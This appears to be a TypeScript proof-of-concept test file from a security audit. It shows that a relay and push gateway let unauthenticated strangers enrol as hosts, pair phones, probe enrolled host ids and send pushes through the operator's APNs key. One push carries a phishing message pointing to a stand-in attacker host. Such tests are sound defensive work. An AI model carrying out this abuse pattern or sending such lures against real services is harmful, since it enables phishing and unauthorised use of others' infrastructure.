import { randomBytes } from 'node:crypto'
import { afterAll, beforeAll, expect, it } from 'vitest'
import { PushGatewayClient } from '../../../../src/main/runtime/push/push-gateway-client'
import { describePoc } from './poc-opt-in'
import {
  enrolHost,
  newHostKeypair,
  phoneConnect,
  postJson,
  startRelayUnderTest,
  type RelayUnderTest
} from './relay-attack-surface'

let relay: RelayUnderTest

describePoc('PoC SR-01/SR-04: anyone on the internet can use the relay and push service', () => {
  beforeAll(async () => {
    relay = await startRelayUnderTest()
  })
  afterAll(async () => {
    await relay?.dispose()
  })

  it('a stranger with a self-generated key becomes a live relay host and pairs a phone', async () => {
    const stranger = newHostKeypair()
    const host = await enrolHost(relay.origin, stranger)
    expect(host.ack.generation).toBeGreaterThan(0)

    const invite = await host.client.createInvite('stranger-phone')
    const phone = await phoneConnect(relay.origin, host.relayHostId, invite.inviteToken)
    expect(phone.hello).toMatchObject({ ok: true, credentialKind: 'invite' })
    await host.stop()
  })

  it('a stranger sends notifications through the operator APNs key and topic', async () => {
    const push = new PushGatewayClient({ gatewayUrl: relay.origin, keypair: newHostKeypair() })
    const token = randomBytes(32).toString('hex')
    const registered = await push.registerDevice({
      deviceId: 'stranger-iphone',
      platform: 'ios',
      token,
      apnsEnvironment: 'production'
    })
    if (!registered.ok) {
      throw new Error(`register failed: ${registered.reason}`)
    }
    const sent = await push.send({
      registrationIds: [registered.registrationId],
      notification: {
        notificationSeq: 1,
        notificationEpoch: 'e',
        source: 'plugin',
        agentState: null,
        title: 'Seal',
        body: 'Sign in again at https://attacker.example'
      }
    })
    expect(sent).toMatchObject({ ok: true, results: [{ status: 'queued' }] })
    const apns = relay.providers.requests.at(-1)!
    expect(apns.path).toBe(`/api.push.apple.com/3/device/${token}`)
    expect(apns.headers['apns-topic']).toBe('com.brokespace.seal.mobile')
    // The gateway (and anyone who compromises it) reads the alert text in the clear.
    expect(JSON.parse(apns.body).aps.alert.body).toBe('Sign in again at https://attacker.example')
  })

  it('resolve tells an unauthenticated caller whether a host id is enrolled', async () => {
    const enrolled = await enrolHost(relay.origin, newHostKeypair())
    await enrolled.stop()
    const probe = (relayHostId: string): Promise<Response> =>
      postJson(`${relay.origin}/v1/resolve`, { v: 1, relayHostId, resumeToken: 'not-a-credential' })
    expect((await probe(enrolled.relayHostId)).status).toBe(200)
    expect((await probe('AAAAAAAAAAAAAAAA')).status).toBe(404)
  })
})
